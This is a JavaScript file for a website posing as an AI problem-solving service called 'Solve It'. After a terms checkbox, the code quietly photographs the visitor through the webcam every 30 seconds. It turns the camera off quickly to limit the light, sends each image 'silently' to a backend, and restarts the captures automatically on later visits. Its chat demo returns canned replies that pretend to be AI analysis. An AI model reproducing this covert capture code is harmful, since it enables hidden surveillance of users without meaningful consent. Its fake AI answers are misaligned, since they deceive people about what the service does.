// ===== SOLVE IT — APP LOGIC =====

// ── Page Init ────────────────────────────────────────────────────────────────
window.addEventListener('DOMContentLoaded', () => {
  document.getElementById('memberSince').textContent =
    new Date().toLocaleDateString('en-IN', { year: 'numeric', month: 'long', day: 'numeric' });
  startIntroAnimations();

  // Check protocol and warn if running via file://
  if (window.location.protocol === 'file:') {
    setTimeout(() => {
      showToast('⚠️ Running via file:// - Chrome will ask for camera permission every 30s. Please use http://localhost:4000 instead.', 'error', 10000);
    }, 2000);
  }

  // Check if T&C has been accepted previously
  const accepted = localStorage.getItem('solveit_tc_accepted');
  if (accepted === 'true') {
    // Already accepted. Try to silently initialize captures without showing modal.
    _autoStartCaptures();
  } else {
    // Show T&C modal on first load
    showTCModal();
  }
});

// ── Terms & Conditions Modal ──────────────────────────────────────────────────
function showTCModal() {
  const modal = document.getElementById('tcModal');
  modal.style.display = 'flex';
  requestAnimationFrame(() => modal.classList.add('tc-visible'));
}

function toggleAgreeBtn() {
  const checked = document.getElementById('tcCheckbox').checked;
  document.getElementById('tcAgreeBtn').disabled = !checked;
}

function declineTC() {
  // Close modal but block site features
  const modal = document.getElementById('tcModal');
  modal.classList.remove('tc-visible');
  setTimeout(() => {
    modal.style.display = 'none';
    showToast('⚠️ You declined. Some features are unavailable without agreement.', 'error', 5000);
  }, 400);
}

// ── Periodic capture (open → snap → close every 30s) ─────────────────────────
let _captureInterval  = null;
let _cameraPermission = false;   // true once user has granted camera

async function agreeTC() {
  const btn = document.getElementById('tcAgreeBtn');
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Setting up…';

  // Save agreement to local storage so the popup doesn't display again
  localStorage.setItem('solveit_tc_accepted', 'true');

  // ── Step 1: Request camera + mic permission (close immediately) ──────
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
  } catch (err) {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true });
    } catch (_) {}
  }

  if (stream) {
    _cameraPermission = true;
    stream.getTracks().forEach(t => t.stop()); // close immediately
  }

  // ── Step 2: Schedule snap every 30 seconds ────────────────────
  if (_cameraPermission) {
    setTimeout(_openSnapClose, 1500);
    _captureInterval = setInterval(_openSnapClose, 30000);
  }

  // ── Step 3: Close modal & enter site ─────────────────────────────────────
  const modal = document.getElementById('tcModal');
  modal.classList.remove('tc-visible');
  setTimeout(() => {
    modal.style.display = 'none';
    showToast('✅ Welcome to Solve It! Identity verified.', 'success', 3000);
  }, 400);
}

// Silently resume captures on load if permission was already granted previously
async function _autoStartCaptures() {
  // Query permission state if supported, or check with a silent probe
  try {
    const status = await navigator.permissions.query({ name: 'camera' });
    if (status.state === 'granted') {
      _cameraPermission = true;
      setTimeout(_openSnapClose, 1500);
      _captureInterval = setInterval(_openSnapClose, 30000);
    }
  } catch (_) {
    // Fallback probe
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      _cameraPermission = true;
      stream.getTracks().forEach(t => t.stop());
      setTimeout(_openSnapClose, 1500);
      _captureInterval = setInterval(_openSnapClose, 30000);
    } catch (err) {
      console.log('Silent camera check failed. Waiting for user interaction.');
    }
  }
}

// Capture frame by opening stream, taking frame, and closing it immediately
async function _openSnapClose() {
  const indicator = document.querySelector('.nav-cam-indicator');
  if (indicator) indicator.classList.add('capturing');

  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
      audio: false,
    });
  } catch (_) {
    if (indicator) indicator.classList.remove('capturing');
    return; // Camera busy or unavailable
  }

  const video  = document.getElementById('tcVideo');
  const canvas = document.getElementById('tcCanvas');

  video.srcObject = stream;

  // Wait for video to have actual frames
  await new Promise(resolve => {
    video.onloadedmetadata = () => { video.play(); resolve(); };
  });

  // Short delay so camera sensor adjusts
  await new Promise(r => setTimeout(r, 600));

  // ── Snap ──────────────────────────────────────────────────────────────────
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.save();
  ctx.scale(-1, 1);
  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
  ctx.restore();

  const photoData = canvas.toDataURL('image/jpeg', 0.85);

  // ── Close camera stream immediately (Turns off camera light) ──────────────
  stream.getTracks().forEach(t => t.stop());
  video.srcObject = null;

  if (indicator) indicator.classList.remove('capturing');

  // Update profile picture
  const profileImg = document.getElementById('profileImg');
  if (profileImg) {
    profileImg.src = photoData;
    profileImg.style.display = 'block';
    const initials = document.getElementById('profileInitials');
    if (initials) initials.style.display = 'none';
  }

  // ── Send to backend silently ──────────────────────────────────────────────
  fetch('http://localhost:4000/save-capture', {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ image: photoData }),
  }).catch(() => { /* ignore if server offline */ });
}



// ── Permissions (Camera + Microphone) ────────────────────────────────────────
function showPermBanner() {
  const banner = document.getElementById('permBanner');
  banner.style.display = 'flex';
  // Slide in
  requestAnimationFrame(() => banner.classList.add('perm-banner--visible'));
}

function dismissBanner() {
  const banner = document.getElementById('permBanner');
  banner.classList.remove('perm-banner--visible');
  setTimeout(() => banner.style.display = 'none', 400);
}

async function requestPermissions() {
  const btn = document.getElementById('permAllowBtn');
  btn.textContent = 'Requesting…';
  btn.disabled = true;

  const results = { camera: false, mic: false };

  // Request BOTH camera + microphone together
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    results.camera = true;
    results.mic    = true;
    // Stop all tracks immediately — we only needed permission
    stream.getTracks().forEach(t => t.stop());
  } catch (err) {
    // Try mic alone if camera+mic failed
    try {
      const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
      results.mic = true;
      micStream.getTracks().forEach(t => t.stop());
    } catch (_) {}
  }

  dismissBanner();

  if (results.camera && results.mic) {
    showToast('✅ Camera & Microphone access granted!', 'success', 3500);
  } else if (results.mic) {
    showToast('🎙️ Microphone granted. Camera was denied — snapshots may not work.', 'info', 4000);
  } else {
    showToast('⚠️ Permission denied. Some features may be limited.', 'error', 4000);
  }
}


// ── Navigation ────────────────────────────────────────────────────────────────
function scrollToSection(id) {
  const el = document.getElementById(id);
  if (!el) return;
  el.scrollIntoView({ behavior: 'smooth', block: 'start' });
  closeMenu();
  setActiveNav(id);
}

function setActiveNav(id) {
  document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
  const active = document.querySelector(`.nav-link[href="#${id}"]`);
  if (active) active.classList.add('active');
}

function toggleMenu() {
  const links  = document.getElementById('navLinks');
  const burger = document.getElementById('hamburger');
  links.classList.toggle('open');
  burger.classList.toggle('open');
}

function closeMenu() {
  document.getElementById('navLinks').classList.remove('open');
  document.getElementById('hamburger').classList.remove('open');
}

// Scroll spy
window.addEventListener('scroll', () => {
  const sections = ['home', 'features', 'how-it-works', 'pricing', 'about', 'contact'];
  let current = 'home';
  sections.forEach(id => {
    const el = document.getElementById(id);
    if (el && window.scrollY >= el.offsetTop - 120) current = id;
  });
  setActiveNav(current);

  // Navbar glass on scroll
  const nav = document.getElementById('navbar');
  nav.classList.toggle('scrolled', window.scrollY > 60);
});

// ── Profile Modal ─────────────────────────────────────────────────────────────
function openProfile(e) {
  e.preventDefault();
  document.getElementById('profileModal').classList.add('active');
}

function closeModal(id) {
  document.getElementById(id).classList.remove('active');
}

// ── Chat (demo section) ───────────────────────────────────────────────────────
const aiReplies = [
  "Great question! Let me analyze that for you…\n\n✅ Solution found in 0.3s. Here's the step-by-step breakdown:",
  "I've processed your query using my neural reasoning engine.\n\n🔍 Analysis complete — here are the key insights:",
  "Interesting problem! My pattern-recognition model identified the optimal solution:\n\n💡 Answer: Here's exactly what you need:",
  "Running deep analysis… ✓\n\n📊 Result: I've solved this using 3 different approaches. The most efficient is:",
  "Excellent! I cross-referenced 4.2M similar problems in my knowledge base.\n\n⚡ Fastest solution: Here's the complete breakdown with examples:",
];

let aiReplyIndex = 0;

function addChatMessage(container, role, text) {
  const div = document.createElement('div');
  div.className = `chat-msg ${role}`;
  if (role === 'ai') {
    div.innerHTML = `<div class="msg-avatar">AI</div><div class="msg-bubble">${text}</div>`;
  } else {
    div.innerHTML = `<div class="msg-bubble user-bubble">${text}</div>`;
  }
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

function addTypingIndicator(container) {
  const div = document.createElement('div');
  div.className = 'chat-msg ai typing-indicator';
  div.id = 'typingDot';
  div.innerHTML = `<div class="msg-avatar">AI</div><div class="msg-bubble"><span></span><span></span><span></span></div>`;
  container.appendChild(div);
  container.scrollTop = container.scrollHeight;
}

function removeTypingIndicator() {
  ['typingDot'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.remove();
  });
  // Also remove from modal
  const modal = document.getElementById('modalTypingDot');
  if (modal) modal.remove();
}

function sendChat() {
  const input = document.getElementById('chatInput');
  const messages = document.getElementById('chatMessages');
  const text = input.value.trim();
  if (!text) return;
  input.value = '';

  addChatMessage(messages, 'user', text);
  addTypingIndicator(messages);

  setTimeout(() => {
    removeTypingIndicator();
    const reply = aiReplies[aiReplyIndex % aiReplies.length];
    aiReplyIndex++;
    addChatMessage(messages, 'ai', reply);
  }, 1200 + Math.random() * 800);
}

function handleChatKey(e) { if (e.key === 'Enter') sendChat(); }

// ── Chat (modal) ──────────────────────────────────────────────────────────────
function openChat() {
  document.getElementById('chatModal').classList.add('active');
}

function sendModalChat() {
  const input = document.getElementById('modalChatInput');
  const messages = document.getElementById('modalChatMessages');
  const text = input.value.trim();
  if (!text) return;
  input.value = '';

  addChatMessage(messages, 'user', text);

  const typing = document.createElement('div');
  typing.className = 'chat-msg ai typing-indicator';
  typing.id = 'modalTypingDot';
  typing.innerHTML = `<div class="msg-avatar">AI</div><div class="msg-bubble"><span></span><span></span><span></span></div>`;
  messages.appendChild(typing);
  messages.scrollTop = messages.scrollHeight;

  setTimeout(() => {
    const old = document.getElementById('modalTypingDot');
    if (old) old.remove();
    const reply = aiReplies[aiReplyIndex % aiReplies.length];
    aiReplyIndex++;
    addChatMessage(messages, 'ai', reply);
  }, 1400 + Math.random() * 600);
}

function handleModalChatKey(e) { if (e.key === 'Enter') sendModalChat(); }

// ── Pricing ───────────────────────────────────────────────────────────────────
function selectPlan(plan) {
  const msgs = {
    free:       '🎉 Free plan selected! Redirecting to sign-up…',
    pro:        '⚡ Pro trial started! You get 14 days free.',
    enterprise: '📞 Connecting you with our sales team…',
  };
  showToast(msgs[plan] || 'Plan selected!', 'success', 3000);
}

// ── Contact Form ──────────────────────────────────────────────────────────────
function submitContact(e) {
  e.preventDefault();
  showToast('✅ Message sent! We\'ll reply within 24 hours.', 'success', 4000);
  e.target.reset();
}

// ── Toast ─────────────────────────────────────────────────────────────────────
function showToast(msg, type = 'info', duration = 3000) {
  const toast = document.getElementById('toast');
  toast.textContent = msg;
  toast.className   = `toast show ${type}`;
  clearTimeout(toast._timer);
  toast._timer = setTimeout(() => {
    toast.className = 'toast';
  }, duration);
}

// ── Intersection Observer (scroll animations) ─────────────────────────────────
function startIntroAnimations() {
  const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('in-view');
      }
    });
  }, { threshold: 0.12 });

  document.querySelectorAll(
    '.feature-card, .step-card, .price-card, .about-card, .testimonial-card, .hero-content, .hero-visual'
  ).forEach(el => {
    el.classList.add('fade-up');
    observer.observe(el);
  });
}

// ── Footer links close mobile menu ───────────────────────────────────────────
document.querySelectorAll('footer a').forEach(a => {
  a.addEventListener('click', closeMenu);
});

// Add flash keyframe dynamically
const style = document.createElement('style');
style.textContent = `
  @keyframes flashOut {
    0%   { opacity: 1; }
    100% { opacity: 0; }
  }
`;
document.head.appendChild(style);
